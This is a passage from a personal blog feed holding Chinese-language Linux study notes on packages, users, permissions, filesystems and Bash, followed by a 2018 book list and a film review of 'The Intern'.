<td style="text-align:center">5</td>
<td style="text-align:center">文件MD5校验和是否改变</td>
<td style="text-align:center">D</td>
<td style="text-align:center">设备的中，从代码是否改变</td>
</tr>
<tr>
<td style="text-align:center">L</td>
<td style="text-align:center">文件路径是否改变</td>
<td style="text-align:center">U</td>
<td style="text-align:center">文件的所有者是否改变</td>
</tr>
<tr>
<td style="text-align:center">G</td>
<td style="text-align:center">文件的属主是否改变</td>
<td style="text-align:center">T</td>
<td style="text-align:center">文件的修改时间是否改变</td>
</tr>
</tbody>
</table>
<p>文件类型</p>
<table>
<thead>
<tr>
<th style="text-align:center">r</th>
<th style="text-align:center">描述文件(read me)</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">c</td>
<td style="text-align:center">配置文件(config file)</td>
</tr>
<tr>
<td style="text-align:center">d</td>
<td style="text-align:center">普通文档(documentation)</td>
</tr>
<tr>
<td style="text-align:center">g</td>
<td style="text-align:center">“鬼”文件(ghost file)，就是该文件不应该被这个RPM包包含</td>
</tr>
<tr>
<td style="text-align:center">l</td>
<td style="text-align:center">授权文件(license file)</td>
</tr>
</tbody>
</table>
<h4 id="RPM包中文件提取"><a href="#RPM包中文件提取" class="headerlink" title="RPM包中文件提取"></a>RPM包中文件提取</h4><p><strong>grammar: rpm2cpio 包全名 | \ </strong></p>
<p><strong>cpio -idv .文件绝对路径</strong></p>
<p>rpm2cpio #将rpm包转换为cpio格式的命令</p>
<p>cpio #是一个标准工具，它用于创建软件档案文件和从档案文件中提取文件</p>
<p>cpio 选项：</p>
<p>-i: copy-in 模式，还原</p>
<p>-d: 还原时自动新建目录</p>
<p>-v: 显示还原过程</p>
<p><img src="https://ws4.sinaimg.cn/large/006tNc79ly1fntteiuxzmj30wg0emdmk.jpg" width="50%"></p>
<h3 id="YUM在线管理"><a href="#YUM在线管理" class="headerlink" title="YUM在线管理"></a>YUM在线管理</h3><h4 id="IP地址配置和网络yum源"><a href="#IP地址配置和网络yum源" class="headerlink" title="IP地址配置和网络yum源"></a>IP地址配置和网络yum源</h4><h5 id="ip地址配置"><a href="#ip地址配置" class="headerlink" title="ip地址配置"></a>ip地址配置</h5><p>使用setup工具</p>
<h5 id="网络yum源"><a href="#网络yum源" class="headerlink" title="网络yum源"></a>网络yum源</h5><p>默认设置好</p>
<h4 id="常用yum命令"><a href="#常用yum命令" class="headerlink" title="常用yum命令"></a>常用yum命令</h4><h5 id="查询所有可用软件包列表"><a href="#查询所有可用软件包列表" class="headerlink" title="查询所有可用软件包列表"></a>查询所有可用软件包列表</h5><p><strong>grammar: yum list</strong></p>
<h5 id="搜索服务器上所有和关键字相关的包"><a href="#搜索服务器上所有和关键字相关的包" class="headerlink" title="搜索服务器上所有和关键字相关的包"></a>搜索服务器上所有和关键字相关的包</h5><p><strong>grammar: yum search 关键字</strong></p>
<h5 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h5><p><strong>grammar: yum -y install 包名</strong></p>
<h5 id="升级"><a href="#升级" class="headerlink" title="升级"></a>升级</h5><p><strong>grammar: yum -y update 包名</strong></p>
<h5 id="卸载"><a href="#卸载" class="headerlink" title="卸载"></a>卸载</h5><p><strong>grammar: yum -y remove 包名</strong></p>
<h4 id="yum软件组命令"><a href="#yum软件组命令" class="headerlink" title="yum软件组命令"></a>yum软件组命令</h4><h5 id="列出"><a href="#列出" class="headerlink" title="列出"></a>列出</h5><p><strong>grammar: yum grouplist</strong></p>
<h5 id="安装-1"><a href="#安装-1" class="headerlink" title="安装"></a>安装</h5><p><strong>grammar: yum groupinstall 软件组名</strong></p>
<h5 id="卸载-1"><a href="#卸载-1" class="headerlink" title="卸载"></a>卸载</h5><p><strong>grammar: yum groupremove 组名</strong></p>
<h3 id="光盘yum源搭建"><a href="#光盘yum源搭建" class="headerlink" title="光盘yum源搭建"></a>光盘yum源搭建</h3><p><img src="https://ws3.sinaimg.cn/large/006tKfTcly1fo0p0g9hyfj310e0nathb.jpg" width="50%"></p>
<p><img src="https://ws1.sinaimg.cn/large/006tKfTcly1fo0p12mdnoj30xa0le10n.jpg" width="50%"></p>
<h3 id="源码包管理"><a href="#源码包管理" class="headerlink" title="源码包管理"></a>源码包管理</h3><h4 id="源码包和RPM包的区别"><a href="#源码包和RPM包的区别" class="headerlink" title="源码包和RPM包的区别"></a>源码包和RPM包的区别</h4><p>安装之前只是概念上的区别，安装之后是安装位置的不同</p>
<p><img src="https://ws3.sinaimg.cn/large/006tKfTcgy1fo27rvx19fj30ze0lq10h.jpg" width="50%"> <img src="https://ws3.sinaimg.cn/large/006tKfTcgy1fo27s2mr4qj30pu094wh8.jpg" width="50%"></p>
<p><img src="https://ws4.sinaimg.cn/large/006tKfTcgy1fo27t0b7hlj30xu0fu45m.jpg" width="50%"></p>
<h3 id="脚本安装包与软件包选择"><a href="#脚本安装包与软件包选择" class="headerlink" title="脚本安装包与软件包选择"></a>脚本安装包与软件包选择</h3><p>脚本安装包类似于windows下软件的安装方式</p>
<p>Webmin是一个基于Web的Linux系统管理界面</p>
<h2 id="用户和用户组管理"><a href="#用户和用户组管理" class="headerlink" title="用户和用户组管理"></a>用户和用户组管理</h2><h3 id="用户配置文件"><a href="#用户配置文件" class="headerlink" title="用户配置文件"></a>用户配置文件</h3><h4 id="用户信息文件-etc-passwd"><a href="#用户信息文件-etc-passwd" class="headerlink" title="用户信息文件 /etc/passwd"></a>用户信息文件 /etc/passwd</h4><p>第一字段：用户名称<br>第二字段：密码标志<br>第三字段：UID（用户ID）<br>​    0：超级用户<br>​    1-499：系统用户（伪用户）<br>​    500-65535：普通用户<br>第四字段：GID（用户组初始ID）<br>第五字段：用户说明<br>第六字段：家目录<br>​    普通用户：/home/用户名/<br>​    超级用户：/root/<br>第七字段：登录之后的Shell（命令解释器）</p>
<h4 id="影子文件-etc-shadow"><a href="#影子文件-etc-shadow" class="headerlink" title="影子文件 /etc/shadow"></a>影子文件 /etc/shadow</h4><p>第一字段：用户名<br>第二字段：加密密码<br>​    加密算法升级为SHA512散列加密算法<br>​    如果密码位是“!!“或“*”代表没有密码，不能登录<br>第三字段：密码最后一次修改日期<br>​    使用1970年1月1日作为标准时间，每过一天时间戳加1<br>第四字段：两次密码的修改时间间隔（和第三字段相比）<br>第五字段：密码有效期（与第三字段相比）<br>第六字段：密码修改到期前的警告天数（和第五字段相比）<br>第七字段：密码过期后的宽限天数（和第五字段相比）<br>​    0:代表密码过期后立即失效<br>​    -1:则代表密码永远不会失效<br>第八字段：账号失效时间<br>​    要用时间戳表示<br>第九字段：保留<br>时间戳的换算：<br>​    把时间戳换算为日期<br>​        date -d “1970-01-01 16066 days”<br>​    把日期换算成时间戳<br>​        echo $(($(date —date=”2014/01/06” +%s)/86400+1))</p>
<h4 id="组信息文件-etc-group-和密码文件-etc-gshadow"><a href="#组信息文件-etc-group-和密码文件-etc-gshadow" class="headerlink" title="组信息文件 /etc/group 和密码文件 /etc/gshadow"></a>组信息文件 /etc/group 和密码文件 /etc/gshadow</h4><p><strong>组信息文件</strong><br>第一字段：组名<br>第二字段：组密码标志<br>第三字段：GID<br>第四字段：组中附加用户<br><strong>组密码文件</strong><br>第一字段：组名<br>第二字段：组密码<br>第三字段：组管理员用户名<br>第四字段：组中附加用户</p>
<h3 id="用户管理相关文件"><a href="#用户管理相关文件" class="headerlink" title="用户管理相关文件"></a>用户管理相关文件</h3><h4 id="用户的家目录"><a href="#用户的家目录" class="headerlink" title="用户的家目录"></a>用户的家目录</h4><p>普通用户：/home/用户名/ ，所有者和所属组都是此用户，权限是700</p>
<p>超级用户：/root/ ，所有者和所属猪都是root用户，权限是500</p>
<h4 id="用户的邮箱"><a href="#用户的邮箱" class="headerlink" title="用户的邮箱"></a>用户的邮箱</h4><p>/var/spool/mail/用户名/</p>
<h4 id="用户模版目录"><a href="#用户模版目录" class="headerlink" title="用户模版目录"></a>用户模版目录</h4><p>/etc/skel/</p>
<h3 id="用户管理命令-1"><a href="#用户管理命令-1" class="headerlink" title="用户管理命令"></a>用户管理命令</h3><h4 id="useradd"><a href="#useradd" class="headerlink" title="useradd"></a>useradd</h4><p><strong>grammar: useradd [选项] 用户名</strong></p>
<p>-u UID: 手工指定用户的UID号</p>
<p>-d 家目录: 手工指定用户的家目录</p>
<p>-c 用户说明: 手工指定用户的说明</p>
<p>-g 组名: 手动指定用户的初始组</p>
<p>-G 组名: 指定用户的附加组</p>
<p>-s shell: 手工指定用户的登录shell，默认是/bin/bash</p>
<p>指定选项添加用户，有以上选项</p>
<h4 id="passwd"><a href="#passwd" class="headerlink" title="passwd"></a>passwd</h4><p><strong>grammar: passwd [选项] 用户名</strong></p>
<p>-S : 查询用户密码的密码状态。仅root用户可用</p>
<p>-l : 暂时锁定用户。仅root用户可用</p>
<p>-u : 解锁用户。仅root用户可用</p>
<p>—stdin 可以通过管道符输出的数据作为用户的密码。</p>
<h4 id="usermod"><a href="#usermod" class="headerlink" title="usermod"></a>usermod</h4><p><strong>grammar: usermod [选项] 用户名</strong></p>
<p>-u UID：修改用户的UID号</p>
<p>-c 用户说明：修改用户的说明信息</p>
<p>-G 组名：修改用户的附加组</p>
<p>-L ：临时锁定用户(Lock)</p>
<p>-U ：解锁用户锁定(Unlock)</p>
<h4 id="change"><a href="#change" class="headerlink" title="change"></a>change</h4><p><strong>grammar: change [选项] 用户名</strong></p>
<p>-l：列出用户的详细密码状态</p>
<p>-d 日期：修改密码最后一次更改日期（shadow3字段）</p>
<p>-m 天数：两次密码修改间隔（4字段）</p>
<p>-M 天数：密码有效期（5字段）</p>
<p>-W 天数：密码过期前警告天数（6字段）</p>
<p>-I 天数：密码过期后宽限天数（7字段）</p>
<p>-E 日期：账号失效时间（8字段）</p>
<h4 id="userdel"><a href="#userdel" class="headerlink" title="userdel"></a>userdel</h4><p><strong>grammar: userdel [-r] 用户名</strong></p>
<p>-r：删除用户的同时删除用户家目录</p>
<h4 id="id"><a href="#id" class="headerlink" title="id"></a>id</h4><p><strong>grammar: id 用户名</strong></p>
<h4 id="su"><a href="#su" class="headerlink" title="su"></a>su</h4><p><strong>grammar: su [选项] 用户名</strong></p>
<p>-：选项只使用“-”代表连带用户的环境变量一起切换</p>
<p>-c：仅执行一次命令，而不切换用户身份</p>
<h3 id="用户组管理命令"><a href="#用户组管理命令" class="headerlink" title="用户组管理命令"></a>用户组管理命令</h3><h4 id="groupadd"><a href="#groupadd" class="headerlink" title="groupadd"></a>groupadd</h4><p><strong>grammar: groupadd [选项] 组名</strong></p>
<p>-g GID：指定组ID</p>
<h4 id="groupmod"><a href="#groupmod" class="headerlink" title="groupmod"></a>groupmod</h4><p><strong>grammar: groupmod [选项] 组名</strong></p>
<p>-g GID：修改组ID</p>
<p>-n 新组名：修改组名</p>
<h4 id="groupdel"><a href="#groupdel" class="headerlink" title="groupdel"></a>groupdel</h4><p><strong>grammar: groupdel 组名</strong></p>
<h4 id="gpasswd"><a href="#gpasswd" class="headerlink" title="gpasswd"></a>gpasswd</h4><p><strong>grammar: gpasswd [选项] 组名</strong></p>
<p>-a 用户名：把用户加入组</p>
<p>-d 用户名：把用户从组中删除</p>
<h2 id="权限管理"><a href="#权限管理" class="headerlink" title="权限管理"></a>权限管理</h2><h3 id="ACL权限"><a href="#ACL权限" class="headerlink" title="ACL权限"></a>ACL权限</h3><h4 id="查看分区ACL权限是否开启"><a href="#查看分区ACL权限是否开启" class="headerlink" title="查看分区ACL权限是否开启"></a>查看分区ACL权限是否开启</h4><p><strong>grammar: dump2fs -h /dev/sda3</strong></p>
<p>-h 仅显示超级块中信息，而不显示磁盘块组的详细信息</p>
<p>df -h 查看硬盘分区情况</p>
<h4 id="临时开启分区ACL权限"><a href="#临时开启分区ACL权限" class="headerlink" title="临时开启分区ACL权限"></a>临时开启分区ACL权限</h4><p><strong>grammar: mount -o remount,acl/</strong></p>
<h4 id="永久开启分区ACL权限"><a href="#永久开启分区ACL权限" class="headerlink" title="永久开启分区ACL权限"></a>永久开启分区ACL权限</h4><p>vi /etc/fstab</p>
<p>将defaults后面加上 <strong>,acl</strong></p>
<p>然后 重启挂载文件系统（mount -o remount /）或者重启系统，使修改生效</p>
<h4 id="查看与设定ACL权限"><a href="#查看与设定ACL权限" class="headerlink" title="查看与设定ACL权限"></a>查看与设定ACL权限</h4><p><strong>grammar: getfacle 文件名</strong></p>
<p>查看acl权限</p>
<p><strong>grammar: setfacl 选项 文件名</strong></p>
<p>-m：设定acl权限</p>
<p>-x：删除指定的acl权限</p>
<p>-b：删除所有的acl权限</p>
<p>-d：设定默认acl权限</p>
<p>-k：删除默认acl权限</p>
<p>-R：递归设定acl权限</p>
<p>给用户设定acl权限：setfacl -m u:st:rx /project</p>
<p>给用户组设定acl权限：setfacl -m g:tgroup2:rwx project/</p>
<h4 id="最大有效权限mask"><a href="#最大有效权限mask" class="headerlink" title="最大有效权限mask"></a>最大有效权限mask</h4><p>修改最大有效权限</p>
<p><strong>grammar: setfacl -m m:rx 文件名</strong></p>
<h4 id="删除ACL权限"><a href="#删除ACL权限" class="headerlink" title="删除ACL权限"></a>删除ACL权限</h4><p>删除指定用户的ACL权限</p>
<p><strong>grammar: setfacl -x u:用户名 文件名</strong></p>
<p>删除指定用户组的ACL权限</p>
<p><strong>grammar: setfacl -x g:组名 文件名</strong></p>
<h4 id="默认ACL权限"><a href="#默认ACL权限" class="headerlink" title="默认ACL权限"></a>默认ACL权限</h4><p><strong>grammar: setfacl -m d:u:用户名:权限 文件名</strong></p>
<h4 id="递归ACL权限"><a href="#递归ACL权限" class="headerlink" title="递归ACL权限"></a>递归ACL权限</h4><p><strong>grammar: setfacl -m u:用户名 -R 文件名</strong></p>
<h3 id="文件特殊权限"><a href="#文件特殊权限" class="headerlink" title="文件特殊权限"></a>文件特殊权限</h3><h4 id="SetUID"><a href="#SetUID" class="headerlink" title="SetUID"></a>SetUID</h4><p>设定SetUID的方法</p>
<p>chmod 4755 文件名</p>
<p>chmod u+s 文件名</p>
<p>取消SetUID的方法</p>
<p>chmod 755 文件名</p>
<p>Chmod u-s 文件名</p>
<h4 id="SetGID"><a href="#SetGID" class="headerlink" title="SetGID"></a>SetGID</h4><p>设定SetGID  2代表SGID</p>
<p>chmod 2755 文件名</p>
<p>chmod g+s 文件名</p>
<h4 id="Sticky-BIT"><a href="#Sticky-BIT" class="headerlink" title="Sticky BIT"></a>Sticky BIT</h4><p>粘着位目前只对目录有效</p>
<p>普通用户对该目录拥有w和x权限，即普通用户可以在此目录拥有写入权限</p>
<p>设置粘着位</p>
<p>chmod 1755 目录名</p>
<p>chmod o+t 目录名</p>
<p>取消粘着位</p>
<p>chmod 777 目录名</p>
<p>chmod o-t 目录名</p>
<h3 id="文件系统属性chattr属性"><a href="#文件系统属性chattr属性" class="headerlink" title="文件系统属性chattr属性"></a>文件系统属性chattr属性</h3><h4 id="chattr-命令格式"><a href="#chattr-命令格式" class="headerlink" title="chattr 命令格式"></a>chattr 命令格式</h4><p><strong>grammar: chattr [+-=] 选项 文件或目录名</strong></p>
<p>+：增加权限</p>
<p>-：删除权限</p>
<p>=：等于某权限</p>
<p>选项：</p>
<p>i：对文件设置i属性不允许对文件进行删除、改名，也不能添加和修改数据；对目录设置i属性，只能修改目录下文件的数据，但不允许建立和删除文件</p>
<p>a：对文件设置a属性，只能在文件中增加数据，但是不能删除，也不能修改数据；对目录设置a属性，只允许在目录下建立和修改文件，但是不允许删除</p>
<h4 id="查看文件系统属性"><a href="#查看文件系统属性" class="headerlink" title="查看文件系统属性"></a>查看文件系统属性</h4><p><strong>grammar: lsattr 选项 文件名</strong></p>
<p>-a：显示所有文件和目录</p>
<p>-d：若目标是目录，仅列出目录本身的属性，而不是子文件的</p>
<h3 id="系统权限sudo命令"><a href="#系统权限sudo命令" class="headerlink" title="系统权限sudo命令"></a>系统权限sudo命令</h3><h4 id="sudo使用"><a href="#sudo使用" class="headerlink" title="sudo使用"></a>sudo使用</h4><p>visudo</p>
<p>实际修改的是 /etc/sudoers 文件</p>
<p><strong>root All=(All) All</strong></p>
<p>用户名 被管理主机的地址=(可使用的身份) 授权命令（绝对路径）</p>
<p>eg: sc ALL=/sbin/shutdown -r now</p>
<p><strong>#%wheel All=(All) All</strong></p>
<p>%组名 被管理主机的地址=(可使用的身份) 授权命令（绝对路径）</p>
<p><strong>普通用户执行sudu赋予命令</strong></p>
<p>su -sc</p>
<p>sudo -l    查看可用的sudo 命令</p>
<h3 id="文件系统管理"><a href="#文件系统管理" class="headerlink" title="文件系统管理"></a>文件系统管理</h3><h4 id="df-文件系统查看命令"><a href="#df-文件系统查看命令" class="headerlink" title="df 文件系统查看命令"></a>df 文件系统查看命令</h4><p><strong>grammar: df 选项 挂载点</strong></p>
<p>-a：显示所有的文件系统信息，包括特殊文件系统</p>
<p>-h：使用习惯单位显示容量，如KB、MB或GB等</p>
<p>-T：显示文件系统类型</p>
<p>-m：以MB为单位显示容量</p>
<p>-k：以KB为单位显示容量，默认就是以KB</p>
<h4 id="du-统计目录或文件大小"><a href="#du-统计目录或文件大小" class="headerlink" title="du 统计目录或文件大小"></a>du 统计目录或文件大小</h4><p><strong>grammar: du 选项 目录或文件名</strong></p>
<p>-a：显示每个子文件的磁盘占用量，默认只统计子目录的磁盘占用量</p>
<p>-h：使用习惯单位显示磁盘占用量</p>
<p>-s：统计总 占用量，而不列出子目录和子文件的占用量</p>
<h4 id="fsck-文件系统修复命令"><a href="#fsck-文件系统修复命令" class="headerlink" title="fsck 文件系统修复命令"></a>fsck 文件系统修复命令</h4><p><strong>grammar: fsck 选项 分区设备文件名</strong></p>
<p>-a：不用显示用户提示，自动修复文件系统</p>
<p>-y：自动修复，和-a作用一致，不过有些只支持-y</p>
<h4 id="dump2fs-显示磁盘状态命令"><a href="#dump2fs-显示磁盘状态命令" class="headerlink" title="dump2fs 显示磁盘状态命令"></a>dump2fs 显示磁盘状态命令</h4><p><strong>grammar: dump2fs 分区设备文件名</strong></p>
<h4 id="挂载命令"><a href="#挂载命令" class="headerlink" title="挂载命令"></a>挂载命令</h4><p><strong>grammar: mount -l</strong></p>
<p>查询系统中已经挂载的设备，-l会显示卷标名称</p>
<p><strong>grammar: mount -a</strong></p>
<p>依据配置文件/etc/fstab的内容，自动挂载</p>
<p><strong>grammar: mount [-t 文件系统] 【-L 卷标名】[-o 特殊选项] 设备文件名 挂载点</strong></p>
<p>-t 文件系统：加入文件系统类型来指定挂载的类型</p>
<p>-L 卷标名：挂载指定卷标的分区，而不是安装设备文件名挂载</p>
<p>-o 特殊选项：可以指定挂载的额外选项</p>
<h4 id="挂载光盘和U盘"><a href="#挂载光盘和U盘" class="headerlink" title="挂载光盘和U盘"></a>挂载光盘和U盘</h4><p><strong>grammar: mkdir /mnt/cdrom/</strong></p>
<p>建立挂载点</p>
<p><strong>grammar: mount -t ios9660 /dev/cdrom /mnt/cdrom/</strong></p>
<p>挂载光盘</p>
<p><strong>grammar: mount /dev/sr0 mnt/cdrom/</strong></p>
<h4 id="卸载命令"><a href="#卸载命令" class="headerlink" title="卸载命令"></a>卸载命令</h4><p><strong>grammar: umount 设备文件名或挂载点</strong></p>
<p><strong>grammar: umount /mnt/cdrom</strong></p>
<h4 id="挂载U盘"><a href="#挂载U盘" class="headerlink" title="挂载U盘"></a>挂载U盘</h4><p><strong>grammar: fdisk -l</strong></p>
<p>查看U盘设备文件名</p>
<p><strong>grammar: mount -t vfat /dev/sdb1 /mnt/sub/</strong></p>
<h4 id="支持NTFS文件系统"><a href="#支持NTFS文件系统" class="headerlink" title="支持NTFS文件系统"></a>支持NTFS文件系统</h4><p>下载插件</p>
<h4 id="fdisk命令分区过程"><a href="#fdisk命令分区过程" class="headerlink" title="fdisk命令分区过程"></a>fdisk命令分区过程</h4><p><strong>grammar: fdisk -l</strong></p>
<p>查看新硬盘</p>
<p><strong>grammar: fdisk /dev/sdb</strong></p>
<p>使用fdisk命令分区</p>
<p><strong>grammar: partprobe</strong></p>
<p>重新读取分区表信息</p>
<p><strong>grammar: mkfs -t ext4 /dev/sdb1</strong></p>
<p>格式化分区</p>
<h4 id="分区自动挂载与fstab文件修复"><a href="#分区自动挂载与fstab文件修复" class="headerlink" title="分区自动挂载与fstab文件修复"></a>分区自动挂载与fstab文件修复</h4><p>/etc/fstab文件各字段的意思</p>
<p>/etc/fstab文件修复</p>
<p><strong>grammar: mount -o remount,rw /</strong></p>
<h4 id="分配swap分区"><a href="#分配swap分区" class="headerlink" title="分配swap分区"></a>分配swap分区</h4><p><strong>grammar: free</strong></p>
<p>查看内存和swap分区使用状况</p>
<p><strong>grammar: fdisk /dev/sdb</strong></p>
<p>新建swap分区，要把分区id改为82</p>
<p><strong>grammar: mkswap /dev/sdb6</strong></p>
<p>格式化</p>
<p><strong>grammar: swapon /dev/sdb6</strong></p>
<p>加入swap分区</p>
<p><strong>grammar: vi /etc/fstab</strong></p>
<p>分区开机自动挂载</p>
<p>/dev/sdb6    swap    swap    defaults    0 0    </p>
<h3 id="Shell基础"><a href="#Shell基础" class="headerlink" title="Shell基础"></a>Shell基础</h3><h4 id="Shell脚本的执行方式"><a href="#Shell脚本的执行方式" class="headerlink" title="Shell脚本的执行方式"></a>Shell脚本的执行方式</h4><p><strong>grammar: echo [选项]【输出内容】</strong></p>
<p>-e：支持反斜线控制的字符转换</p>
<p>一定要加 <strong>#!/bin/bash </strong></p>
<p>脚本执行：</p>
<ol>
<li>赋予执行权限(chmod 755 hello.sh) -&gt; 直接运行(./hello.sh)</li>
<li>通过Bash调用执行脚本(Bash hello.sh)</li>
</ol>
<p>格式转换：</p>
<ol>
<li>yum -y install dos2unix</li>
<li>Dos2unix xxx.sh</li>
</ol>
<h4 id="Bash的基本功能"><a href="#Bash的基本功能" class="headerlink" title="Bash的基本功能"></a>Bash的基本功能</h4><p><strong>历史命令与命令补全</strong></p>
<p><strong>grammar: history [选项] 【历史命令保存文件】</strong></p>
<p>-c：清空历史命令</p>
<p>-w：把缓存中的历史命令写入历史命令保存文件~/.bas_history</p>
<p>历史命令默认会保存1000条，可以在环境变量配置文件/etc/profile中进行修改</p>
<p>历史命令的调用：</p>
<ol>
<li>使用上、下箭头调用以前的历史命令</li>
<li>使用 “!n“ 重复执行第n条历史命令</li>
<li>使用 “!!” 重复执行上一条命令</li>
<li>使用 “!字串” 重复执行最后一条以该字串开头的命令</li>
</ol>
<p><strong>命令与文件补全</strong></p>
<p>两次Tab可以列出匹配的命令或者文件名</p>
<p><strong>命令别名</strong></p>
<p><strong>grammar: alias 别名=’原命令’</strong></p>
<p>设定命令别名</p>
<p><strong>grammar: vi /root/bashrc</strong></p>
<p>让别名永久生效</p>
<p><strong>grammar: unalias 别名</strong> </p>
<p>删除别名</p>
<p><strong>输出从定向</strong></p>
<p>分为 标准输出从定向 和 标准错误输出从定向</p>
<p><strong>输入从定向</strong></p>
<p><strong>grammar: wc [选项]【文件名】</strong></p>
<p> -c：统计字节数</p>
<p>-w：统计单词数</p>
<p>-l：统计行数</p>
<p><strong>多命令顺序执行</strong></p>
<p>命令1;命令2</p>
<p>命令1&amp;&amp;命令2</p>
<p>命令1||命令2</p>
<p><strong>管道符</strong></p>
<p><strong>grammar: 命令1|命令2</strong></p>
<p>命令1的正确输出作为命令2的操作对象</p>
<p>常配合grep使用</p>
<p><strong>grammar: grep [选项] ”搜索内容“</strong></p>
<p>-i：忽略大小写</p>
<p>-n：输出行号</p>
<p>-v：反向查找</p>
<p>—color=auto 搜索出的关键字用颜色显示</p>
<p><strong>通配符</strong></p>
<p>?：匹配一个任意字符</p>
<p>*：匹配0个或任意多个字符，也就是可以匹配任何内容</p>
<p>[]：匹配括号中任意一个字符。例如：[abc]代表一定匹配一个字符，或者是a，或者是b，或者是c</p>
<p>[-]：匹配中括号中任意一个字符，- 代表一个范围。例如：[a-z] 代表匹配一个小写字母</p>
<p>[`]：逻辑非，表示匹配不是中括号的一个字符。例如 [^0-9] 代表匹配一个不是数字的字符</p>
<p><strong>Bash中其他特殊符号</strong></p>
<p><img src="https://ws1.sinaimg.cn/large/006tNc79ly1fp9acfz37aj31260mqtn9.jpg" alt=""></p>
</the></excerpt>]]></content>
      
        <categories>
            
            <category> Study </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Summary </tag>
            
            <tag> Linux </tag>
            
            <tag> Notes </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[My Book List In 2018]]></title>
      <url>/2018/01/01/2018books/</url>
      <content type="html"><![CDATA[<p><excerpt in="" index="" |="" 首页摘要=""><br>The books i have read in 2018.<a id="more"></a></excerpt></p>
<the rest="" of="" contents="" |="" 余下全文="">



<h2 id="Professional"><a href="#Professional" class="headerlink" title="Professional"></a>Professional</h2><h3 id="《白帽子讲安全》"><a href="#《白帽子讲安全》" class="headerlink" title="《白帽子讲安全》"></a>《白帽子讲安全》</h3><h3 id="《代码审计-企业级web代码安全架构》"><a href="#《代码审计-企业级web代码安全架构》" class="headerlink" title="《代码审计:企业级web代码安全架构》"></a>《代码审计:企业级web代码安全架构》</h3><h3 id="《黑客攻防技术宝典：Web实战篇-第2版-》"><a href="#《黑客攻防技术宝典：Web实战篇-第2版-》" class="headerlink" title="《黑客攻防技术宝典：Web实战篇(第2版)》"></a>《黑客攻防技术宝典：Web实战篇(第2版)》</h3><h3 id="《鸟哥的Linux私房菜-基础学习篇-第三版-》"><a href="#《鸟哥的Linux私房菜-基础学习篇-第三版-》" class="headerlink" title="《鸟哥的Linux私房菜 基础学习篇(第三版)》"></a>《鸟哥的Linux私房菜 基础学习篇(第三版)》</h3><h2 id="Interesting"><a href="#Interesting" class="headerlink" title="Interesting"></a>Interesting</h2><h3 id="《一句顶一万句》"><a href="#《一句顶一万句》" class="headerlink" title="《一句顶一万句》"></a><a href="https://book.douban.com/subject/3633461/" target="_blank" rel="noopener">《一句顶一万句》</a></h3><h3 id="《一个人的朝圣》"><a href="#《一个人的朝圣》" class="headerlink" title="《一个人的朝圣》"></a><a href="https://book.douban.com/subject/24934182/" target="_blank" rel="noopener">《一个人的朝圣》</a></h3></the>]]></content>
      
        <categories>
            
            <category> Life </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Perception </tag>
            
            <tag> Book </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[My Film List In 2018]]></title>
      <url>/2018/01/01/2018films/</url>
      <content type="html"><![CDATA[<p><excerpt in="" index="" |="" 首页摘要=""><br>The films i have watched in 2018.<a id="more"></a></excerpt></p>
<the rest="" of="" contents="" |="" 余下全文="">

<p><br></p>
<h3 id="xXx-Return-of-Xander-Cage-极限特工1-2-3"><a href="#xXx-Return-of-Xander-Cage-极限特工1-2-3" class="headerlink" title="xXx.Return.of.Xander.Cage. (极限特工1-2-3)"></a>xXx.Return.of.Xander.Cage. (极限特工1-2-3)</h3><h3 id="The-Foreigner-英伦对决"><a href="#The-Foreigner-英伦对决" class="headerlink" title="The.Foreigner. (英伦对决)"></a>The.Foreigner. (英伦对决)</h3><h3 id="The-Intern（实习生）"><a href="#The-Intern（实习生）" class="headerlink" title="The Intern（实习生）"></a>The Intern（实习生）</h3><p>​    <strong>It is really a powerful and inspiring film. </strong></p>
<p><img src="https://ws1.sinaimg.cn/large/006tNbRwly1fncq0kp77tj30u018g13h.jpg" width="80%"></p>
<p>附上让我知道这部电影的海报：<em>Experience never gets old.</em> </p>
<p>Ben，是一个传统却又以高标准要求自己的gentleman。虽将至古稀，但仍热爱生活，尝试各种新鲜事物，无意中发现并参加了一间电商公司Fit的”Senior Intern”项目……</p>
<p>Jules，一个聪明、善良、励志但又可怜、脆弱的女强人，一个亲力亲为，无私付出，带领自己的公司在几个月内完成5年的目标……</p>
<p><img src="https://ws2.sinaimg.cn/large/006tNbRwly1fncpx4jqwdj31hc0tse82.jpg" width="40%"><img src="https://ws2.sinaimg.cn/large/006tNbRwly1fncpylx50sj31hc0tsnpe.jpg" width="40%"></p>
<p>同样是同一天进入公司实习的人，P1是现代小伙的装备，P2是传统严谨的Ben的装备。</p>
<p><img src="https://ws4.sinaimg.cn/large/006tNbRwly1fncpzqu69hj31hc0tsnpe.jpg" width="50%"></p>
<p>看着桌子上的MacBook不晓得怎么开机……（这里让我笑了好久～）</p>
<p>Jules是一个新时代女性的象征，是女强人的代表，用新时代的理念管理公司；与员工打成一片，其实如今许多互联网公司也是如此，因为这样更能激发“创新”行为。</p>
<p>Jules也不是完美的，但她非常清楚地了解自己，知道自己“习惯把丑话说在前头，习惯保护自己的隐私“。而且她还很注重保护Matt的自尊心，因为他怕别人因为他是一个house-husband而瞧不起他。</p>
<p>这样的女人，实在是太聪明了。</p>
<p>但她终究是女人，终究有自己脆弱的时候。</p>
<p><strong>这个世界有让她失望的地方，但她从来不要求别人改变，哪怕别人有可能伤害她。她只要求自己做得更好。</strong></p>
<p>面对公司与家庭，</p>
<p>Jules笑过，烦恼过，醉过，哭过……</p>
<p>Ben的gentleman风度和作风让“鸭梨山大、时间永远不够用”的 Jules有一丝平静的时候（我更愿意理解成：Jules 找到了一个懂她的人——Ben）于是，在后来Ben 陪 Jules 去旧金山开会时，他们就来了次“促膝长谈”</p>
<p>后来，她选择了忍让，选择了原谅。回家后就与Matt 坦白“you and me , us”。</p>
<p>彻夜思考之后，第二天，Jules 一早来到 Ben 的家，Ben说了一番”心灵鸡汤“后，她决定要 follow her heart.去做自己喜欢做的事情，哪怕今后她没有任何支持，哪怕她最终要埋在Ben 旁边。</p>
<p>结果就是，当Jules 准备打电话拒绝旧金山的CEO时，Matt 匆匆忙忙来到公司，希望自己能改过……</p>
<p>后来Jules 兴匆匆地想告诉Ben 这个好消息，结果发现他请假了，在公园才找到似乎在打“太极”的Ben，继续给Jules 熬“心灵鸡汤”——找到内在的平衡。</p>
